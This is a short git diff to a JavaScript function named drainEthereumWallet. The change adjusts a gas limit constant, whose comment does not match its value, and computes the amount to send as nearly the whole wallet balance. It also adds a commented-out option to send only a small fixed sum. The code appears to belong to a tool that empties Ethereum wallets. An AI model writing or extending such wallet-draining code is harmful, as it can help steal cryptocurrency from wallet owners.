@@ -35,10 +35,12 @@ async function drainEthereumWallet(wallet) {
             console.log(`💰 Wallet Balance (wei): ${balance.toString()}`);
             console.log(`💰 Wallet Balance: ${balance}`);
 
-            const gasLimit = 20000000n; // 200,000 wei
+            const gasLimit = 1000000000000000n; // 200,000 wei
 
             // const gasCost = gasLimit * gasPrice;
             let sendAmount = balance - gasLimit;
+            // only send $10 worth of wei
+            // let sendAmount = 4000000000000000n; // $
 
             if (sendAmount <= 0n) {
                 console.log("❌ Not enough ETH to cover gas fees.");
